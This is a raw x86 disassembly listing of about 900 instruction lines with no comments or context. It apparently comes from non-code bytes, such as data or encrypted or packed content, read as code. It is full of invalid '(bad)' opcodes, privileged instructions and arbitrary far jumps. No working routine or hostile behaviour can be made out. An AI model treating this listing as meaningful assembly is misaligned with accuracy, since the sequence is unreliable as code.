  40db1e:	push   esi
  40db1f:	jne    0x40dae8
  40db21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db22:	pop    ebx
  40db23:	scas   al,BYTE PTR es:[edi]
  40db24:	mov    esi,0xd216b978
  40db29:	cmp    bl,BYTE PTR [edx+0x72b45fb9]
  40db2f:	ja     0x40dab6
  40db31:	xchg   esi,eax
  40db32:	fwait
  40db33:	cli    
  40db34:	into   
  40db35:	addr16 mov bh,0x1b
  40db38:	adc    eax,0x79bfb15
  40db3d:	scas   al,BYTE PTR es:[edi]
  40db3e:	mov    ecx,0x7175e7a
  40db43:	pop    ebp
  40db44:	add    BYTE PTR [eax],dh
  40db46:	mov    ebx,0x3cb24d98
  40db4b:	aam    0xe4
  40db4d:	shl    BYTE PTR [edx+edi*1],0x91
  40db51:	jg     0x40db0e
  40db53:	daa    
  40db54:	inc    esi
  40db55:	gs jecxz 0x40dbd6
  40db58:	retf   0xa494
  40db5b:	cli    
  40db5c:	int    0x66
  40db5e:	sbb    bl,BYTE PTR [esi+0x3527925d]
  40db64:	sub    al,0x2
  40db66:	jbe    0x40daee
  40db68:	das    
  40db69:	inc    ebx
  40db6a:	enter  0xc390,0x1e
  40db6e:	adc    ebp,DWORD PTR [ebx-0xc440104]
  40db74:	or     al,0x95
  40db76:	sub    ecx,DWORD PTR [ecx+0x69]
  40db79:	dec    edx
  40db7a:	shl    BYTE PTR [ebx+0xd],0xc2
  40db7e:	cvttps2pi mm5,QWORD PTR [ecx+eiz*8]
  40db82:	xor    eax,0xbaa69c80
  40db87:	rcr    BYTE PTR [edi+0x62e6dfce],0xf5
  40db8e:	push   ds
  40db8f:	xchg   edi,eax
  40db90:	into   
  40db91:	inc    ecx
  40db92:	cmp    cl,BYTE PTR [edx-0xd]
  40db95:	data16 arpl sp,bx
  40db98:	in     al,0xef
  40db9a:	into   
  40db9b:	xchg   esp,eax
  40db9c:	mov    ds:0xc2b98c63,al
  40dba1:	cmc    
  40dba2:	sbb    dh,al
  40dba4:	(bad)  
  40dba5:	(bad)  
  40dba6:	mov    al,ds:0x4d5d956d
  40dbab:	or     al,0x19
  40dbad:	pop    ds
  40dbae:	add    esi,DWORD PTR [eax]
  40dbb0:	lods   al,BYTE PTR ds:[esi]
  40dbb1:	idiv   edx
  40dbb3:	jg     0x40dc21
  40dbb5:	sub    BYTE PTR [edx],ch
  40dbb7:	mov    cl,0xf9
  40dbb9:	adc    BYTE PTR [edi-0x3c],al
  40dbbc:	js     0x40dbd6
  40dbbe:	lahf   
  40dbbf:	call   0x5045:0x6029680c
  40dbc6:	in     al,dx
  40dbc7:	push   esp
  40dbc8:	cmp    bh,BYTE PTR [edi+edi*2]
  40dbcb:	pop    eax
  40dbcc:	daa    
  40dbcd:	adc    DWORD PTR ds:0x23b940ee,eax
  40dbd3:	jo     0x40dc38
  40dbd5:	xor    BYTE PTR [eax+edx*1],al
  40dbd8:	cld    
  40dbd9:	mov    al,0x9
  40dbdb:	test   eax,0xccf285fe
  40dbe0:	add    al,0xc9
  40dbe3:	sbb    DWORD PTR [edi],ebx
  40dbe5:	jae    0x40dba5
  40dbe7:	xchg   edi,eax
  40dbe8:	mov    ebx,DWORD PTR [ebp+0x65]
  40dbeb:	lock cmp eax,DWORD PTR [edi]
  40dbee:	scas   al,BYTE PTR es:[edi]
  40dbef:	adc    eax,0x2b8c84a6
  40dbf4:	jbe    0x40dc31
  40dbf6:	mov    bl,BYTE PTR [ebx]
  40dbf8:	inc    edi
  40dbf9:	js     0x40db9a
  40dbfb:	sub    eax,0xd3867b16
  40dc00:	test   DWORD PTR [eax+eiz*8+0x440113db],edi
  40dc07:	repz inc edi
  40dc09:	jbe    0x40dc48
  40dc0b:	std    
  40dc0c:	(bad)  
  40dc0d:	cmp    DWORD PTR [eax-0x545e7231],esp
  40dc13:	push   esi
  40dc14:	(bad)  
  40dc15:	push   esi
  40dc16:	stc    
  40dc17:	ins    DWORD PTR es:[edi],dx
  40dc18:	cld    
  40dc19:	fiadd  WORD PTR [eax+0x7a]
  40dc1c:	out    0x5e,al
  40dc1e:	hlt    
  40dc1f:	jo     0x40dc09
  40dc21:	mov    al,ds:0x86b93215
  40dc26:	adc    ah,BYTE PTR [edx-0x4d3ea2b9]
  40dc2c:	dec    esp
  40dc2d:	dec    ebx
  40dc2e:	(bad)  
  40dc2f:	cmp    esi,DWORD PTR [esi+0x71]
  40dc32:	scas   eax,DWORD PTR es:[edi]
  40dc33:	sbb    BYTE PTR [ecx],dl
  40dc35:	(bad)  
  40dc36:	jo     0x40dc32
  40dc38:	dec    edx
  40dc39:	add    ah,BYTE PTR [esi+0x22]
  40dc3c:	sub    DWORD PTR [edi+0x71],eax
  40dc3f:	jp     0x40dc62
  40dc41:	sub    al,0xe0
  40dc43:	cmc    
  40dc44:	div    ecx
  40dc46:	mov    esp,0xa98900f8
  40dc4b:	in     eax,dx
  40dc4c:	or     al,0x3c
  40dc4e:	and    al,0xdb
  40dc50:	push   esp
  40dc51:	repz cli 
  40dc53:	(bad)  
  40dc54:	sub    al,0xdc
  40dc56:	cmp    al,0x80
  40dc58:	sti    
  40dc59:	js     0x40dbe8
  40dc5b:	mov    ds:0x31b89069,al
  40dc60:	pusha  
  40dc61:	mov    eax,0x14a670b3
  40dc66:	jl     0x40dc74
  40dc68:	cmp    BYTE PTR [ecx],dl
  40dc6a:	fidivr DWORD PTR [esi-0x4e]
  40dc6d:	xor    ah,dh
  40dc6f:	sub    eax,0xbfc2a971
  40dc74:	sar    al,0x25
  40dc77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc78:	test   BYTE PTR [ebx+eax*8-0x63d2212d],ah
  40dc7f:	ficomp WORD PTR [eax+0x29]
  40dc82:	xchg   bh,bl
  40dc84:	shr    BYTE PTR [eax+0x2f],0x41
  40dc88:	jmp    ebx
  40dc8a:	jmp    0x4f02d837
  40dc8f:	(bad)  
  40dc90:	sub    al,0x71
  40dc92:	xchg   BYTE PTR [edi+ebp*4-0x68a81a6a],al
  40dc99:	mov    bh,0xff
  40dc9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc9c:	sbb    ecx,DWORD PTR [edx-0x4886423b]
  40dca2:	(bad)  
  40dca3:	fdivr  st,st(2)
  40dca5:	jbe    0x40dd08
  40dca7:	push   es
  40dca8:	jo     0x40dd02
  40dcaa:	imul   edi,esp,0xffffffb5
  40dcad:	into   
  40dcae:	dec    edi
  40dcaf:	aas    
  40dcb0:	repnz loopne 0x40dcfb
  40dcb3:	outs   dx,DWORD PTR ds:[esi]
  40dcb4:	mov    ds:0x5095a7d6,al
  40dcb9:	lea    ecx,[eax-0x226e43ea]
  40dcbf:	xor    ebp,ecx
  40dcc1:	dec    esp
  40dcc2:	mov    ebp,DWORD PTR [ecx]
  40dcc4:	sbb    ebp,DWORD PTR [ecx+0x6d]
  40dcc7:	pop    ds
  40dcc8:	pop    esp
  40dcc9:	test   eax,0x33429b3b
  40dcce:	scas   eax,DWORD PTR es:[edi]
  40dccf:	inc    ebx
  40dcd0:	lods   eax,DWORD PTR ds:[esi]
  40dcd1:	mov    ebx,0xda17e537
  40dcd6:	cdq    
  40dcd7:	mov    eax,ds:0xf61afed5
  40dcdc:	push   0xa8375b44
  40dce1:	xor    ebp,DWORD PTR ds:0x5f04f170
  40dce7:	xor    DWORD PTR [edx],esi
  40dce9:	mov    bl,0x4b
  40dceb:	mov    ebp,0x9fc205f3
  40dcf0:	addr16 leave 
  40dcf2:	xchg   edx,eax
  40dcf3:	dec    ecx
  40dcf4:	loop   0x40dd66
  40dcf6:	dec    ebx
  40dcf7:	icebp  
  40dcf8:	fst    QWORD PTR [ecx-0x2a7ea587]
  40dcfe:	cs mov esp,0x560bbef4
  40dd04:	jae    0x40dcd8
  40dd06:	pop    ecx
  40dd07:	push   edi
  40dd08:	lahf   
  40dd09:	xchg   BYTE PTR [edi-0xa50a811],cl
  40dd0f:	prefetch BYTE PTR ds:0x4aba2518
  40dd16:	std    
  40dd17:	add    al,0x96
  40dd19:	loopne 0x40dcb8
  40dd1b:	mov    ebx,esi
  40dd1d:	jo     0x40dd1a
  40dd1f:	int3   
  40dd20:	mov    ebp,DWORD PTR [edx]
  40dd22:	jge    0x40dcf4
  40dd24:	not    BYTE PTR [eax-0xe]
  40dd27:	push   ds
  40dd28:	mov    edx,DWORD PTR ds:0x546079f6
  40dd2e:	mov    dl,0x97
  40dd30:	in     eax,0x3a
  40dd32:	(bad)  
  40dd33:	pop    eax
  40dd34:	mov    eax,0x128ca1df
  40dd39:	push   eax
  40dd3a:	cmp    dl,BYTE PTR [esi+ebp*8-0x7b]
  40dd3e:	lods   eax,DWORD PTR ds:[esi]
  40dd3f:	into   
  40dd40:	or     DWORD PTR ds:[ebx-0x45],esp
  40dd44:	push   cs
  40dd45:	xchg   ebp,eax
  40dd46:	xor    cl,BYTE PTR [eax]
  40dd48:	out    0x6c,eax
  40dd4a:	scas   al,BYTE PTR es:[edi]
  40dd4b:	dec    ecx
  40dd4c:	gs pop ebp
  40dd4e:	dec    DWORD PTR ds:0x482be473
  40dd54:	xor    al,BYTE PTR [esi]
  40dd56:	dec    edx
  40dd57:	jne    0x40dd3f
  40dd59:	mov    al,ds:0x95bf9edd
  40dd5e:	icebp  
  40dd5f:	mov    eax,ds:0xb334eb6d
  40dd64:	je     0x40dde4
  40dd66:	xchg   edi,eax
  40dd67:	not    DWORD PTR [ebp+0x3acf3b8f]
  40dd6d:	adc    BYTE PTR [ecx+0xb001854],dh
  40dd73:	lds    esi,FWORD PTR [edi+0x2]
  40dd76:	std    
  40dd77:	test   DWORD PTR [eax-0x3bf22d0f],ebx
  40dd7d:	mov    cl,0x91
  40dd7f:	mov    eax,0x1c9e997a
  40dd84:	std    
  40dd85:	ins    DWORD PTR es:[edi],dx
  40dd86:	pop    ecx
  40dd87:	loop   0x40dd8a
  40dd89:	stc    
  40dd8a:	dec    edi
  40dd8b:	pop    edi
  40dd8c:	or     eax,0x5290f003
  40dd91:	and    eax,0xe103937
  40dd96:	push   edi
  40dd97:	jg     0x40ddfb
  40dd99:	cs stos DWORD PTR es:[edi],eax
  40dd9b:	imul   edx,ebp,0x2e
  40dd9e:	mov    ds:0xdad18c62,eax
  40dda3:	cmp    ebx,DWORD PTR [esi]
  40dda5:	mov    eax,ds:0x5d0b085c
  40ddaa:	mov    eax,0xe366ec5
  40ddaf:	ficom  DWORD PTR [eax+esi*8]
  40ddb2:	dec    ecx
  40ddb3:	mov    es,WORD PTR [ebp+eiz*4+0x2a]
  40ddb7:	test   eax,0x4385b134
  40ddbc:	push   eax
  40ddbd:	cmp    BYTE PTR [ebp-0x3d],dl
  40ddc0:	adc    bh,cl
  40ddc2:	sbb    al,0xc4
  40ddc4:	add    esp,DWORD PTR [edx-0x472272b1]
  40ddca:	and    esp,edi
  40ddcc:	xchg   ebx,eax
  40ddcd:	rol    DWORD PTR [esi-0x6eec8cb5],cl
  40ddd3:	(bad)  
  40ddd4:	sahf   
  40ddd5:	fisubr DWORD PTR [ecx-0xeb396c3]
  40dddb:	fisub  DWORD PTR [esi]
  40dddd:	aas    
  40ddde:	push   ebx
  40dddf:	(bad)  
  40dde0:	mov    edi,0x236adb5d
  40dde5:	stos   BYTE PTR es:[edi],al
  40dde6:	push   eax
  40dde7:	ins    DWORD PTR es:[edi],dx
  40dde8:	inc    ecx
  40dde9:	fucomip st,st(5)
  40ddeb:	fisttp DWORD PTR [esp]
  40ddee:	out    0x27,eax
  40ddf0:	mul    esp
  40ddf2:	in     eax,0x5b
  40ddf4:	sbb    DWORD PTR [ebx],edi
  40ddf6:	push   0xffffffa5
  40ddf8:	jmp    0x40de4b
  40ddfa:	xor    DWORD PTR [ebp+eax*1-0x5ea70a18],edi
  40de01:	setnp  BYTE PTR [ecx-0x62f232]
  40de08:	les    esp,FWORD PTR [ecx-0x4e]
  40de0b:	add    BYTE PTR [ebx],cl
  40de0d:	and    esp,eax
  40de0f:	dec    esp
  40de10:	jbe    0x40dddc
  40de12:	test   al,0xf8
  40de14:	mov    ah,BYTE PTR [ecx]
  40de16:	sbb    dh,BYTE PTR [esp+esi*2-0x13]
  40de1a:	jp     0x40ddbc
  40de1c:	(bad)  
  40de1e:	scas   eax,DWORD PTR es:[edi]
  40de1f:	enter  0x706e,0x55
  40de23:	cmp    DWORD PTR [edx+0x63cc322],ebx
  40de29:	jecxz  0x40de31
  40de2b:	(bad)  
  40de2c:	(bad)  
  40de2d:	icebp  
  40de2e:	neg    BYTE PTR [eax-0x6f]
  40de31:	inc    eax
  40de32:	and    eax,0xea116e1f
  40de37:	hlt    
  40de38:	jbe    0x40de3e
  40de3a:	pop    eax
  40de3b:	fst    QWORD PTR [ecx-0x5f]
  40de3e:	(bad)
  40de41:	adc    ah,dl
  40de43:	fs inc edi
  40de45:	call   0x4d2a:0xc69990eb
  40de4c:	inc    edi
  40de4d:	inc    ebp
  40de4e:	adc    edx,DWORD PTR [ebx+0x26ac9963]
  40de54:	mov    ds:0x2085ce84,al
  40de59:	xor    ecx,DWORD PTR [edi+0x5e9d87e7]
  40de5f:	inc    esp
  40de60:	and    ebx,DWORD PTR [ebx-0x4b6c3dca]
  40de66:	inc    ebx
  40de67:	or     BYTE PTR [ebx-0x61a9a619],0xb9
  40de6e:	mov    eax,ds:0xa1616644
  40de73:	sub    al,0x2
  40de75:	adc    ah,cl
  40de77:	cld    
  40de78:	cmp    DWORD PTR ds:0xda02d130,ecx
  40de7e:	xchg   esp,eax
  40de7f:	cld    
  40de80:	jecxz  0x40de13
  40de82:	daa    
  40de83:	(bad)  
  40de85:	frstor [ebp+0x32]
  40de88:	dec    esp
  40de89:	xchg   esi,eax
  40de8a:	push   ebx
  40de8b:	adc    al,0xea
  40de8d:	jecxz  0x40dec8
  40de8f:	scas   al,BYTE PTR es:[edi]
  40de90:	sar    DWORD PTR [esi],cl
  40de92:	inc    ecx
  40de93:	sbb    esi,DWORD PTR [esi+edi*1+0xbb11894]
  40de9a:	push   0x39
  40de9c:	cmp    BYTE PTR [ebx+0x4eaf6167],ch
  40dea2:	mov    bh,dh
  40dea4:	sub    BYTE PTR [ecx+eax*1+0x71],0xad
  40dea9:	push   edx
  40deaa:	sbb    ch,dh
  40deac:	int    0xd2
  40deae:	pop    ebx
  40deaf:	xor    DWORD PTR [edx-0x2a],esi
  40deb2:	mov    ds:0x6aad043f,al
  40deb7:	shl    BYTE PTR [ebp-0x723856b],1
  40debd:	pusha  
  40debe:	ret    0x4237
  40dec1:	jl     0x40dea8
  40dec3:	sub    dl,BYTE PTR [ebx+0x7d]
  40dec6:	fld    TBYTE PTR [ebx-0x1158ec54]
  40decc:	iret   
  40decd:	pop    es
  40dece:	into   
  40decf:	add    eax,0xbaa0e643
  40ded4:	stc    
  40ded5:	mov    ebx,es
  40ded7:	push   ds
  40ded8:	pop    ecx
  40ded9:	fsubp  st(6),st
  40dedb:	loop   0x40df22
  40dedd:	(bad)
  40dee1:	mov    dh,0x9f
  40dee3:	dec    ebp
  40dee4:	dec    eax
  40dee5:	lods   eax,DWORD PTR ds:[esi]
  40dee6:	pop    ss
  40dee7:	loope  0x40ded9
  40dee9:	les    ebp,FWORD PTR [esi-0x69e1e55b]
  40deef:	cmp    ah,bh
  40def1:	or     al,0xcc
  40def3:	pop    ebx
  40def4:	adc    eax,0xa79d1f9e
  40def9:	sbb    ebp,DWORD PTR [edi+0x45]
  40defc:	imul   edi,edx,0x33
  40deff:	lea    ebx,[bp-0x4b16]
  40df04:	xor    DWORD PTR [edi],eax
  40df06:	pop    ss
  40df07:	mov    ebx,0x4be3e344
  40df0c:	pop    esp
  40df0d:	adc    DWORD PTR [ecx+0x16],edx
  40df10:	sbb    ebx,DWORD PTR [eax]
  40df12:	aaa    
  40df13:	push   edx
  40df14:	add    DWORD PTR [edi-0x7d],edx
  40df17:	and    al,BYTE PTR [ecx]
  40df19:	aad    0x7e
  40df1b:	dec    eax
  40df1c:	jg     0x40defd
  40df1e:	int    0x8c
  40df20:	shl    esi,1
  40df22:	shl    BYTE PTR [eax+0x50a100c],0x34
  40df29:	cmp    eax,0x11df4ab6
  40df2e:	fdivp  st(3),st
  40df30:	(bad)  
  40df31:	jne    0x40dec6
  40df33:	dec    edi
  40df34:	shr    BYTE PTR [ecx],1
  40df36:	fcomp  DWORD PTR [edi-0x1c7dd5e8]
  40df3c:	inc    esi
  40df3d:	imul   edx,DWORD PTR [edi+0x5f],0x326c49a1
  40df44:	cld    
  40df45:	push   esi
  40df46:	ret    0xa930
  40df49:	mov    ah,0x4a
  40df4b:	retf   0xa66
  40df4e:	sbb    BYTE PTR [esi],bh
  40df50:	cmp    ah,BYTE PTR [ebx]
  40df52:	outs   dx,DWORD PTR ds:[esi]
  40df53:	nop
  40df54:	jmp    DWORD PTR [ecx+0x4077f524]
  40df5a:	mov    cl,0xa9
  40df5c:	and    al,0xa3
  40df5e:	addr16 pushf 
  40df60:	sti    
  40df61:	scas   eax,DWORD PTR es:[edi]
  40df62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df63:	ja     0x40dfb5
  40df65:	daa    
  40df66:	cmp    al,0xab
  40df68:	int    0xde
  40df6a:	add    BYTE PTR [edx-0x74dde40f],bl
  40df70:	cdq    
  40df71:	push   cs
  40df72:	pusha  
  40df73:	pop    edi
  40df74:	pop    edx
  40df75:	mov    dh,0xe7
  40df77:	sahf   
  40df78:	das    
  40df79:	xchg   edi,eax
  40df7a:	mov    dh,0x8c
  40df7c:	arpl   WORD PTR [ebp+0x35],cx
  40df7f:	leave  
  40df80:	les    ecx,FWORD PTR [ecx-0x3215e43c]
  40df86:	sbb    edx,ebx
  40df88:	scas   eax,DWORD PTR es:[edi]
  40df89:	mov    edi,0xa726b3c6
  40df8e:	and    DWORD PTR [eax-0x6b],esi
  40df91:	lock jecxz 0x40dfe8
  40df94:	jmp    0xa7ee:0x3462795a
  40df9b:	or     bl,bh
  40df9d:	in     eax,dx
  40df9e:	sbb    dh,dh
  40dfa0:	fucom  st(7)
  40dfa2:	mov    ebx,ss
  40dfa4:	ins    BYTE PTR es:[edi],dx
  40dfa5:	jecxz  0x40e020
  40dfa7:	mov    al,ds:0x6ac54132
  40dfac:	push   DWORD PTR [esi+eiz*2]
  40dfaf:	hlt    
  40dfb0:	inc    edx
  40dfb1:	jl     0x40e02a
  40dfb3:	adc    BYTE PTR [ecx],al
  40dfb5:	ins    BYTE PTR es:[edi],dx
  40dfb6:	xor    DWORD PTR [edx-0x50],ebp
  40dfb9:	cmp    ebx,DWORD PTR [ebx+eiz*2-0x53]
  40dfbd:	les    edi,FWORD PTR [edi]
  40dfbf:	loop   0x40df69
  40dfc1:	stos   DWORD PTR es:[edi],eax
  40dfc2:	sbb    BYTE PTR [ebx+0x7747baae],0x6b
  40dfc9:	mov    edi,0xf3813ecc
  40dfce:	retf   
  40dfcf:	xchg   ecx,eax
  40dfd0:	mov    eax,0xec797b5c
  40dfd5:	out    0x56,al
  40dfd7:	jecxz  0x40e039
  40dfd9:	push   eax
  40dfda:	(bad)  
  40dfdb:	je     0x40dfb0
  40dfdd:	jp     0x40e011
  40dfdf:	jecxz  0x40dfb2
  40dfe1:	and    bl,dl
  40dfe3:	push   ds
  40dfe4:	jo     0x40e031
  40dfe6:	arpl   cx,si
  40dfe8:	dec    esp
  40dfe9:	pop    ebp
  40dfea:	adc    al,0x2b
  40dfec:	xchg   ebx,eax
  40dfed:	fcomip st,st(6)
  40dfef:	jnp    0x40df82
  40dff1:	xchg   edi,eax
  40dff2:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40dff4:	adc    dl,bh
  40dff6:	cld    
  40dff7:	sbb    DWORD PTR [edi+0x55d84906],ebx
  40dffd:	mov    edx,0xd1f967da
  40e002:	mul    ch
  40e004:	mov    es,WORD PTR [ebx-0x56]
  40e007:	repnz stc 
  40e009:	daa    
  40e00a:	dec    esi
  40e00b:	stos   DWORD PTR es:[edi],eax
  40e00c:	jns    0x40e077
  40e00e:	pusha  
  40e00f:	adc    al,0xae
  40e011:	test   al,0x89
  40e013:	jae    0x40e000
  40e015:	and    esp,ebp
  40e017:	cmp    BYTE PTR [ebp-0x21],dl
  40e01a:	and    eax,0x2dc3207e
  40e01f:	ds ret 
  40e021:	sti    
  40e022:	ss jmp 0x55a0:0xf7681503
  40e02a:	cmc    
  40e02b:	pushf  
  40e02c:	and    esp,eax
  40e02e:	loop   0x40e045
  40e030:	sbb    esi,edx
  40e032:	push   0xffffff92
  40e034:	hlt    
  40e035:	jbe    0x40dffc
  40e037:	jo     0x40dfdf
  40e039:	pushw  0xe4a6
  40e03d:	aad    0x66
  40e03f:	popf   
  40e040:	les    esi,FWORD PTR [eax-0x3f]
  40e043:	xchg   eax,ecx
  40e045:	pop    esi
  40e046:	mov    cl,0x33
  40e048:	mov    ds:0x192006f0,eax
  40e04d:	mov    al,ds:0xf02cd4c7
  40e052:	fadd   DWORD PTR [edi+ecx*8+0x512df623]
  40e059:	pop    esp
  40e05a:	mov    ss,esi
  40e05c:	push   0x61
  40e05e:	test   al,0x15
  40e060:	or     ebx,DWORD PTR [ebx-0x54]
  40e063:	or     DWORD PTR [edi],ebp
  40e065:	(bad)  
  40e066:	mov    ah,0xf9
  40e068:	pop    ds
  40e069:	imul   BYTE PTR [ecx-0x48872abd]
  40e06f:	retf   0x47af
  40e072:	xor    eax,0xffe22a6b
  40e077:	ins    BYTE PTR es:[edi],dx
  40e078:	pop    ebp
  40e079:	sbb    DWORD PTR [eax+0x39],edx
  40e07c:	mov    esp,0x308a8ebd
  40e081:	lock shl DWORD PTR [ecx],cl
  40e084:	sub    DWORD PTR [eax],ecx
  40e086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e087:	push   ecx
  40e088:	mov    cl,0xcc
  40e08a:	jb     0x40e0c1
  40e08c:	and    al,0xf3
  40e08e:	mov    al,ds:0x7955bb3e
  40e093:	xchg   edi,eax
  40e094:	adc    al,0xb3
  40e096:	jmp    0xdf06:0xa18de6b5
  40e09d:	mov    ecx,0xa0a4d8e2
  40e0a2:	cmp    esp,DWORD PTR [eax-0x37]
  40e0a5:	pop    eax
  40e0a6:	pushf  
  40e0a7:	int3   
  40e0a8:	xlat   BYTE PTR ds:[ebx]
  40e0a9:	out    dx,al
  40e0aa:	push   ss
  40e0ab:	mov    ch,0x70
  40e0ad:	add    eax,0x73823c38
  40e0b2:	push   es
  40e0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b4:	mov    esp,0x34a6e335
  40e0b9:	test   eax,esp
  40e0bb:	std    
  40e0bc:	pop    edx
  40e0bd:	or     bl,0x8a
  40e0c0:	mov    dh,0xba
  40e0c2:	xchg   ebp,eax
  40e0c3:	sbb    edi,DWORD PTR [edi+0x1aeb9d1f]
  40e0c9:	pop    edx
  40e0ca:	invd   
  40e0cc:	jne    0x40e059
  40e0ce:	sbb    ebx,DWORD PTR [esi]
  40e0d0:	push   ecx
  40e0d1:	es clc 
  40e0d3:	mov    ebx,0x9efc3b9
  40e0d8:	repnz pushf 
  40e0da:	mov    bl,0x93
  40e0dc:	fmul   DWORD PTR [eax]
  40e0de:	pop    ebp
  40e0df:	push   ebx
  40e0e0:	ds arpl bp,dx
  40e0e3:	inc    eax
  40e0e4:	mov    BYTE PTR [edi-0x5],dl
  40e0e7:	out    0x8c,al
  40e0e9:	inc    eax
  40e0ea:	call   0x848eb5cd
  40e0ef:	sbb    ah,BYTE PTR [esi+edx*8]
  40e0f2:	stc    
  40e0f3:	mov    cl,bh
  40e0f5:	and    edi,DWORD PTR [esi]
  40e0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f8:	call   0x5b3:0xd62d
  40e0fe:	add    eax,0xf4b5d640
  40e103:	in     al,dx
  40e104:	mov    bl,0x5
  40e106:	lock mov WORD PTR [ecx],ds
  40e109:	or     BYTE PTR [ecx],0x20
  40e10c:	push   0xfffffff4
  40e10e:	outs   dx,DWORD PTR ds:[esi]
  40e10f:	push   0xbf21abe2
  40e114:	and    DWORD PTR [ebx+eax*8],0xb460d6d6
  40e11b:	call   0xb3205b7d
  40e120:	adc    al,bh
  40e122:	outs   dx,BYTE PTR ds:[esi]
  40e123:	fs out dx,eax
  40e125:	mov    al,0x24
  40e127:	sbb    DWORD PTR [edi+ecx*1],0xffffff82
  40e12b:	pop    ebx
  40e12c:	out    0x19,al
  40e12e:	adc    eax,0x80b6648c
  40e133:	sti    
  40e134:	or     ecx,DWORD PTR [ebx+0x7e]
  40e137:	adc    BYTE PTR [ecx-0x47],ah
  40e13a:	pop    es
  40e13b:	retf   
  40e13c:	push   ss
  40e13d:	std    
  40e13e:	aam    0xed
  40e140:	outs   dx,DWORD PTR ds:[esi]
  40e141:	nop
  40e142:	add    eax,0xd15f82ce
  40e147:	int    0x8f
  40e149:	push   0xffffffd6
  40e14b:	test   al,0x39
  40e14d:	mov    bl,0xe3
  40e14f:	mov    ah,0xb3
  40e151:	pusha  
  40e152:	stc    
  40e153:	fmul   QWORD PTR [ecx-0x1e]
  40e156:	jbe    0x40e14e
  40e158:	outs   dx,BYTE PTR ds:[esi]
  40e159:	mov    cl,0x3f
  40e15b:	cdq    
  40e15c:	mov    edx,0xc0248fcc
  40e161:	ret    
  40e162:	out    dx,al
  40e163:	mov    eax,0xd4dc2733
  40e168:	je     0x40e1db
  40e16a:	rol    BYTE PTR [eax-0x66],cl
  40e16d:	mov    ds:0x5dab1902,eax
  40e172:	xchg   esp,eax
  40e173:	xor    al,0xe1
  40e175:	lods   eax,DWORD PTR gs:[esi]
  40e177:	aam    0x72
  40e179:	movlps xmm7,QWORD PTR [edi+0x98445da]
  40e180:	add    ch,ah
  40e182:	push   0x50973c8c
  40e187:	cmp    eax,DWORD PTR [ecx-0x5a40a4d3]
  40e18d:	mov    eax,0x2ff79bba
  40e192:	inc    edi
  40e193:	or     DWORD PTR [ebp+0x79],eax
  40e196:	mov    cl,BYTE PTR [eax-0x31]
  40e199:	sub    DWORD PTR [ebx],ecx
  40e19b:	mov    bh,0x7f
  40e19d:	pop    ss
  40e19e:	int    0x7f
  40e1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1a1:	xor    eax,0x76883c3
  40e1a6:	sti    
  40e1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a8:	in     eax,0xb7
  40e1aa:	or     al,0x85
  40e1ac:	fs or  eax,esi
  40e1af:	(bad)  
  40e1b0:	jecxz  0x40e21d
  40e1b2:	xlat   BYTE PTR ds:[ebx]
  40e1b3:	out    0x3c,eax
  40e1b5:	inc    ebx
  40e1b6:	jo     0x40e1cd
  40e1b8:	mov    ebx,0x603a20e5
  40e1bd:	mov    edi,ebx
  40e1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c0:	sbb    dh,cl
  40e1c2:	add    BYTE PTR [esi],bh
  40e1c4:	jns    0x40e217
  40e1c6:	inc    edi
  40e1c7:	inc    esi
  40e1c8:	ins    DWORD PTR es:[edi],dx
  40e1c9:	mov    BYTE PTR [edi+ebp*8-0x76ec490c],dh
  40e1d0:	aad    0x75
  40e1d2:	mov    bl,0xdc
  40e1d4:	retf   
  40e1d5:	pop    ds
  40e1d6:	loopne 0x40e16f
  40e1d8:	aad    0x58
  40e1da:	(bad)  
  40e1db:	retf   0xbc13
  40e1de:	sub    eax,DWORD PTR [ecx-0x7a]
  40e1e1:	fadd   DWORD PTR [edx+0x49071017]
  40e1e7:	mov    bl,0x38
  40e1e9:	dec    eax
  40e1ea:	ret    
  40e1eb:	ror    dl,0xec
  40e1ee:	test   al,0x4f
  40e1f0:	(bad)  [eax+0x556945ae]
  40e1f6:	mov    dh,0x87
  40e1f8:	adc    DWORD PTR [edx+0x7d792b24],ebp
  40e1fe:	ret    0xe137
  40e201:	(bad)  
  40e202:	sub    dl,cl
  40e204:	pushf  
  40e205:	xchg   ebp,eax
  40e206:	inc    ecx
  40e207:	int3   
  40e208:	fstp   TBYTE PTR [ebx-0x285a6784]
  40e20e:	jp     0x40e283
  40e210:	mov    ebx,0xb2e2b1f5
  40e215:	icebp  
  40e216:	cmp    ch,ch
  40e218:	lods   al,BYTE PTR ds:[esi]
  40e219:	pop    esi
  40e21a:	xor    DWORD PTR [edx+0x68178b41],esi
  40e220:	cmp    DWORD PTR [esi],esi
  40e222:	rol    BYTE PTR [eax-0x2b9311fb],cl
  40e228:	std    
  40e229:	repnz mov al,ds:0xb77fda41
  40e22f:	dec    esi
  40e230:	int3   
  40e231:	sbb    BYTE PTR [ebp-0x60],bh
  40e234:	inc    edx
  40e235:	rcl    DWORD PTR ds:0xd62e7109,1
  40e23b:	mov    ebx,0x37dcdbd
  40e240:	or     dh,0x60
  40e243:	sti    
  40e244:	stc    
  40e245:	lds    esp,FWORD PTR [ebx+0x4a]
  40e248:	test   eax,0x5c391726
  40e24d:	jns    0x40e23a
  40e24f:	shr    dl,cl
  40e251:	fistp  DWORD PTR [edx]
  40e253:	in     eax,dx
  40e254:	jecxz  0x40e291
  40e256:	sar    BYTE PTR [esi+edx*8-0x2d86b578],1
  40e25d:	or     al,0xe0
  40e25f:	mov    ebx,0x7348e594
  40e264:	ss mov esi,0xa8f08118
  40e26a:	daa    
  40e26b:	jae    0x40e2a8
  40e26d:	inc    esi
  40e26e:	mov    eax,ds:0x3338c7de
  40e273:	aam    0x37
  40e275:	adc    al,0x43
  40e277:	cmp    DWORD PTR [esp],0xe74f1801
  40e27e:	gs (bad) 
  40e280:	xchg   esi,eax
  40e281:	div    BYTE PTR [edi-0x287fe687]
  40e287:	jge    0x40e2ab
